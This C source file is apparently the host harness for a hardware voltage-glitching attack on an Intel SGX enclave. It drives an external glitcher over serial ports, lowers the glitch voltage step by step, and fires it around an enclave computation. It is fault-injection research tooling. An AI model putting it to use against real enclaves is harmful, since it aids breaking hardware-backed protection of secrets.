#include <sgx_urts.h>
#include "Enclave/encl_u.h"
#include <sys/mman.h>
#include <signal.h>
#include <curses.h>
#include <stdint.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <inttypes.h>

#include "hwvolt.h"

#define BUFLEN 2048
#define SGX_AESGCM_MAC_SIZE 16
#define SGX_AESGCM_IV_SIZE 12

#define ENCLAVE_FILE "CryptoEnclave.signed.so"

/* OCall functions */
void ocall_print_string(const char *str)
{
	/* Proxy/Bridge will check the length and null-terminate 
	 * the input string to prevent buffer overflow. 
	 */
	printf("\t[Enclave] %s", str);
	refresh();
}

void ocall_phex(const uint8_t *print_me, int len)
{
	char *output = malloc(len * 2 + 1);
	char *ptr = output;
	for (int i = 0; i < len; i++)
	{
		ptr += sprintf(ptr, "%02x", (uint8_t)print_me[i]);
	}
	printf("\t%s\n", output);
	free(output);
}
int main(int argc, char **argv)
{
	sgx_launch_token_t token = {0};
	int retval = 0, updated = 0;
	char old = 0x00, new = 0xbb;
	sgx_enclave_id_t eid = 0;
	uint64_t ret;
	const char *program = argv[0];

	if (argc != 3)
	{
		printf("Need 2 args: %s iterations step \n", program);
		exit(-1);
	}
	// init hw volt
	if( init_hw_volt("/dev/ttyS0","/dev/ttyACM0",115200) == -1){
		return -1;
	}

	// will make it respond faster
	TRIGGER_RST
	TRIGGER_SET
	TRIGGER_RST

	int count = atoi(argv[2]);
	for(int i=0; i<count; i++) {

		for (int ii =0; ii< 3; ii++) {
			// configure the glitch
			configure_glitch_with_delay(1, 0.835, 29, 0.640 - 0.005*i, -25, 0.835, 1300);

			printf("count: %d \n", i);
			sgx_create_enclave("./Enclave/encl.so", /*debug=*/1, &token, &updated, &eid, NULL);

			int j = 0;

			int iterations = atoi(argv[1]);

			// TRIGGER
			TRIGGER_SET
			enclave_calculation(eid, iterations);
			// RESET TRIGGER
			TRIGGER_RST

			sleep(1);
			//usleep(700000);
		}
	}


	sgx_destroy_enclave(eid);
	return 0;
}
